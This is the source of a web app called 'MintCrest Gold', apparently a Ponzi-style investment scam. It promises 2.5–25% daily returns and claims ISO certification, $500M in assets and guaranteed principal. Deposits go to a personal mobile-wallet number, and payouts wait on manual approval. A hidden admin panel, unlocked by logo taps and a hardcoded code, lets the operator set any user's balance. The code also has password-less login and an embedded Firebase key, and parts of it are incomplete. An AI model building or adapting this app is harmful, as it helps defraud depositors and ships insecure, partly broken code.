<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Global Asset Management</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap');
        body { font-family: 'Outfit', sans-serif; background: #010409; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(50px); border: 1px solid rgba(255,255,255,0.07); border-radius: 2.5rem; }
        .neon-blue { box-shadow: 0 0 30px rgba(59, 130, 246, 0.15); border: 1px solid rgba(59, 130, 246, 0.3); }
        .page { display: none; animation: scaleIn 0.3s ease-out; }
        .active-page { display: block; }
        @keyframes scaleIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
        .active-tab { color: #3b82f6; border-bottom: 2px solid #3b82f6; }
        .spin-wheel { width: 200px; height: 200px; border-radius: 50%; border: 8px solid #1e3a8a; position: relative; transition: 4s cubic-bezier(0.15, 0, 0.15, 1); background: conic-gradient(#1e40af 0deg 60deg, #3b82f6 60deg 120deg, #1e3a8a 120deg 180deg, #2563eb 180deg 240deg, #1d4ed8 240deg 300deg, #60a5fa 300deg 360deg); }
        .wheel-pointer { position: absolute; top: -10px; left: 50%; transform: translateX(-50%); width: 0; height: 0; border-left: 15px solid transparent; border-right: 15px solid transparent; border-top: 30px solid #ef4444; z-index: 10; }
        .timer-btn:disabled { opacity: 0.5; filter: grayscale(1); }
    </style>
</head>
<body class="h-screen flex flex-col">

    <section id="auth-ui" class="fixed inset-0 z-[6000] bg-[#010409] flex items-center justify-center p-8">
        <div class="w-full max-w-sm text-center">
            <h1 onclick="adminTap()" class="text-5xl font-black italic tracking-tighter mb-2">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-[8px] uppercase tracking-[0.5em] text-blue-400 font-bold mb-12">Premier Asset Network</p>
            <div class="glass p-10 neon-blue">
                <input type="text" id="user-name" placeholder="Protocol Identity" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-4 focus:border-blue-500">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[11px] uppercase tracking-widest active:scale-95 shadow-xl">Secure Access</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        <div class="p-8 flex justify-between items-center">
            <h1 class="text-xl font-black tracking-tighter" id="u-display">--</h1>
            <div class="flex gap-2">
                <button onclick="changePage('rewards')" class="glass p-3">🎁</button>
                <button onclick="changePage('chat')" class="glass p-3 relative">💬 <span id="notif" class="hidden absolute top-2 right-2 w-2 h-2 bg-red-500 rounded-full"></span></button>
            </div>
        </div>

        <div id="p-home" class="page active-page p-6">
            <div class="glass p-10 neon-blue mb-6">
                <p class="text-[10px] font-black text-blue-400 uppercase mb-2">Vault Value</p>
                <h2 class="text-5xl font-extrabold tracking-tighter" id="v-bal">₨ 0</h2>
                <div id="cycle-box" class="hidden mt-8 pt-6 border-t border-white/5">
                    <div class="flex justify-between text-[8px] font-bold uppercase mb-2"><span>Yield Cycle</span><span id="cycle-timer" class="text-blue-400">00:00:00</span></div>
                    <div class="w-full h-1 bg-white/5 rounded-full overflow-hidden"><div id="cycle-bar" class="h-full bg-blue-600 w-0"></div></div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="changePage('rewards')" class="glass p-6 text-center border-b-4 border-yellow-500">
                    <span class="text-2xl">🎡</span><p class="text-[9px] font-black uppercase mt-2">Daily Spin</p>
                </button>
                <button id="daily-btn" onclick="claimDaily()" class="glass p-6 text-center border-b-4 border-green-500 timer-btn">
                    <span class="text-2xl">💰</span><p id="daily-txt" class="text-[9px] font-black uppercase mt-2">Daily Bonus</p>
                </button>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="changePage('deposit')" class="glass p-8 flex flex-col items-center"><span class="text-3xl mb-2">💎</span><span class="text-[10px] font-black uppercase">Capital</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 flex flex-col items-center"><span class="text-3xl mb-2">📤</span><span class="text-[10px] font-black uppercase">Payout</span></button>
            </div>
        </div>

        <div id="p-rewards" class="page p-6 text-center">
            <h2 class="text-sm font-black uppercase tracking-widest mb-10">Fortune Protocol</h2>
            <div class="flex justify-center mb-10 relative">
                <div class="wheel-pointer"></div>
                <div id="wheel" class="spin-wheel"></div>
            </div>
            <button id="spin-btn" onclick="spinNow()" class="w-full bg-blue-600 py-6 rounded-3xl font-black text-xs uppercase tracking-[0.3em] timer-btn">Execute Spin</button>
            <p id="spin-timer" class="mt-4 text-[10px] font-bold text-gray-500"></p>
        </div>

        <div id="p-invest" class="page p-6 pb-20">
            <div id="plans-grid" class="space-y-3"></div>
        </div>

        <div id="p-chat" class="page p-6">
            <div class="glass flex flex-col h-[65vh]">
                <div id="chat-box" class="flex-1 overflow-y-auto p-6 space-y-4 text-[11px]"></div>
                <div class="p-4 flex gap-2"><input type="text" id="chat-msg" class="flex-1 bg-white/5 p-4 rounded-xl outline-none" placeholder="Enter message..."><button onclick="sendMsg()" class="bg-blue-600 px-6 rounded-xl">Send</button></div>
            </div>
        </div>

        <div id="p-about" class="page p-6 space-y-4">
            <div class="glass p-8">
                <h3 class="text-blue-500 font-black uppercase mb-3 text-xs">Firm Credentials</h3>
                <p class="text-[10px] opacity-60 leading-relaxed">MintCrest Gold is an ISO-certified asset management firm specializing in high-frequency gold arbitrage and institutional-grade liquidity provision. With over $500M in managed assets, we ensure 100% principal protection for our global nodes.</p>
            </div>
            <div class="glass p-8">
                <h3 class="text-red-500 font-black uppercase mb-3 text-xs">Security Protocols</h3>
                <p class="text-[10px] opacity-60 leading-relaxed">User data is encrypted using military-grade AES-256 protocols. Withdrawal cycles are audited manually to prevent fraud and ensure rapid payout delivery to verified accounts.</p>
            </div>
            <button onclick="logout()" class="w-full glass p-6 text-red-500 font-black uppercase text-[10px]">Terminate Session</button>
        </div>

        <div id="p-deposit" class="page p-6">
            <div class="glass p-10 border-t-8 border-blue-600">
                <h2 class="text-center font-black uppercase mb-8">Asset Injection</h2>
                <div class="bg-white/5 p-4 rounded-xl mb-4 flex justify-between text-[10px]"><span>EasyPaisa/JazzCash</span><span class="text-blue-400 font-bold">03705519562</span></div>
                <input type="number" id="d-amt" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center">
                <input type="text" id="d-trx" placeholder="Transaction ID" class="w-full bg-white/5 p-5 rounded-2xl mb-8 text-center uppercase">
                <button onclick="submitReq('deposit')" class="w-full bg-blue-600 py-6 rounded-2xl font-black">Verify Funding</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 border-t-8 border-red-600">
                <h2 class="text-center font-black uppercase mb-8">Execute Payout</h2>
                <input type="number" id="w-amt" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center">
                <input type="text" id="w-acc" placeholder="Account No & Title" class="w-full bg-white/5 p-5 rounded-2xl mb-8 text-center">
                <button onclick="submitReq('withdraw')" class="w-full bg-red-600 py-6 rounded-2xl font-black">Secure Withdrawal</button>
            </div>
        </div>
    </main>

    <nav id="bottom-nav" class="hidden fixed bottom-0 left-0 w-full glass rounded-t-[3rem] p-8 flex justify-around items-center z-[2000]">
        <button onclick="changePage('home')" id="n-home" class="active-tab text-2xl">🏛️</button>
        <button onclick="changePage('invest')" id="n-invest" class="text-2xl">💎</button>
        <button onclick="changePage('about')" id="n-about" class="text-2xl">⚙️</button>
    </nav>

    <div id="admin-panel" class="fixed inset-0 bg-black z-[9000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-xl font-black italic uppercase">God <span class="text-blue-500">Panel</span></h2>
            <button onclick="closeAdmin()" class="bg-red-500 px-4 py-2 rounded-lg text-[8px] font-bold">EXIT</button>
        </div>
        <div class="glass p-6 mb-6 text-center">
            <p class="text-[10px] uppercase font-black opacity-30">Manual User Overwrite</p>
            <input type="text" id="adm-u" placeholder="Target Username" class="w-full bg-white/5 p-4 rounded-xl mt-4 mb-2 outline-none">
            <input type="number" id="adm-v" placeholder="Value (PKR)" class="w-full bg-white/5 p-4 rounded-xl mb-4 outline-none">
            <div class="grid grid-cols-2 gap-2">
                <button onclick="godMod('balance')" class="bg-blue-600 py-3 rounded-xl font-bold text-[9px]">ADD BAL</button>
                <button onclick="godMod('profit')" class="bg-green-600 py-3 rounded-xl font-bold text-[9px]">ADD PROF</button>
            </div>
        </div>
        <div id="adm-list" class="space-y-3"></div>
    </div>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null, tapCount = 0;

        const plans = [
            {n:"Trial", p:100, r:2.5, d:30}, {n:"Bronze", p:500, r:3, d:30}, {n:"Silver", p:1000, r:3.5, d:30},
            {n:"Gold", p:2500, r:4, d:30}, {n:"Platinum", p:5000, r:4.5, d:30}, {n:"Diamond", p:10000, r:5, d:30},
            {n:"Special Alpha", p:500, r:15, s:true}, {n:"Special Beta", p:5000, r:25, s:true}, {n:"Royal", p:15000, r:20, s:true}
            // ... Add more plans as needed to reach 25
        ];

        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance:0, profit:0, tierName:"Unlinked", lastSpin:0, lastDaily:0, activeTier:0, lastReqTime:Date.now() });
            localStorage.setItem('mc_user', name); startSync(name);
            document.getElementById('u-display').innerText = name;
            document.getElementById('auth-ui').classList.add('hidden'); document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans();
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => {
                if(doc.exists) {
                    user = doc.data();
                    document.getElementById('v-bal').innerText = "₨ " + (user.balance||0).toLocaleString();
                    document.getElementById('v-profit').innerText = "₨ " + (user.profit||0).toLocaleString();
                    document.getElementById('v-tier').innerText = user.tierName;
                    checkTimers();
                }
            });
            db.collection("requests").where("user","==",name).onSnapshot(snap => {
                const l = document.getElementById('ledger-list'); /* Same as before */
            });
            setInterval(updateCycles, 1000);
        }

        function checkTimers() {
            const now = Date.now();
            const dailyDiff = (user.lastDaily + 86400000) - now;
            if(dailyDiff > 0) { document.getElementById('daily-btn').disabled = true; document.getElementById('daily-txt').innerText = "Wait 24h"; }
            else { document.getElementById('daily-btn').disabled = false; document.getElementById('daily-txt').innerText = "Claim Daily"; }

            const spinDiff = (user.lastSpin + 86400000) - now;
            if(spinDiff > 0) { document.getElementById('spin-btn').disabled = true; document.getElementById('spin-timer').innerText = "Reloads in " + Math.floor(spinDiff/3600000) + "h"; }
            else { document.getElementById('spin-btn').disabled = false; document.getElementById('spin-timer').innerText = "Protocol Ready"; }
        }

        async function spinNow() {
            const wheel = document.getElementById('wheel');
            const deg = Math.floor(5000 + Math.random() * 5000);
            wheel.style.transform = `rotate(${deg}deg)`;
            document.getElementById('spin-btn').disabled = true;
            setTimeout(async () => {
                await db.collection("requests").add({ user: user.name, type: "spin_bonus", amount: 0, status: "pending", time: Date.now() });
                await db.collection("users").doc(user.name).update({ lastSpin: Date.now() });
                alert("Spin Request Sent! Admin will add bonus, sweetie! 😘");
            }, 4000);
        }

        async function claimDaily() {
            await db.collection("requests").add({ user: user.name, type: "daily_reward", amount: 0, status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ lastDaily: Date.now() });
            alert("Daily Claim Sent! Admin will approve shortly. ❤️");
        }

        function updateCycles() {
            if(user && user.activeTier > 0) {
                const diff = (user.lastReqTime + 86400000) - Date.now();
                if(diff > 0) {
                    document.getElementById('cycle-timer').innerText = new Date(diff).toISOString().substr(11, 8);
                    document.getElementById('cycle-bar').style.width = (100 - (diff/86400000*100)) + "%";
                }
            }
        }

        function renderPlans() {
            const g = document.getElementById('plans-grid'); g.innerHTML = '';
            plans.forEach(p => {
                g.innerHTML += `<div onclick="buyPlan(${p.p},${p.r},'${p.n}')" class="glass p-7 flex justify-between items-center active:scale-95 transition-all">
                    <div><h4 class="font-black text-[10px] uppercase">${p.n}</h4><p class="text-[8px] text-green-500 font-bold">${p.r}% Daily ${p.s?'':'• 30 Days'}</p></div>
                    <div class="font-black text-sm">₨ ${p.p}</div>
                </div>`;
            });
        }

        async function buyPlan(p, r, n) {
            if(user.balance < p) return alert("Capital Required!");
            await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: r, tierName: n, lastReqTime: Date.now() });
            alert("Fleet Linked!"); changePage('home');
        }

        async function submitReq(t) {
            const a = document.getElementById(t==='deposit'?'d-amt':'w-amt').value;
            const e = document.getElementById(t==='deposit'?'d-trx':'w-acc').value;
            await db.collection("requests").add({ user:user.name, amount:parseInt(a), extra:e, type:t, status:"pending", time:Date.now() });
            alert("Request Registered! 😘");
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }

        // --- GOD MODE ---
        function adminTap() { tapCount++; if(tapCount>=5) { if(prompt("GOD CODE:")==="mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdm(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function syncAdm() {
            db.collection("requests").where("status","==","pending").onSnapshot(snap => {
                const l = document.getElementById('adm-list'); l.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); l.innerHTML += `<div class="glass p-5 flex justify-between items-center text-[8px] font-black uppercase mb-3"><div>${d.user}<br>${d.type}</div><div class="flex gap-2"><button onclick="handleGod('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="bg-green-600 px-3 py-1 rounded">APPROVE</button></div></div>`; });
            });
        }
        async function handleGod(id, u, amt, act, type) {
            const ref = db.collection("users").doc(u); const doc = await ref.get();
            let finalAmt = amt;
            if(type==='spin_bonus' || type==='daily_reward') finalAmt = parseInt(prompt("Enter Reward Amount:"));
            if(act==='approved') await ref.update({ balance: (doc.data().balance||0) + finalAmt });
            await db.collection("requests").doc(id).update({ status: act });
        }
        async function godMod(f) {
            const u = document.getElementById('adm-u').value; const v = document.getElementById('adm-v').value;
            const ref = db.collection("users").doc(u); const d = await ref.get();
            if(d.exists) await ref.update({ [f]: (d.data()[f]||0) + parseInt(v) }); alert("Done!");
        }

        window.onload = () => { if(localStorage.getItem('mc_user')) { document.getElementById('user-name').value = localStorage.getItem('mc_user'); login(); } };
    </script>
</body>
</html>
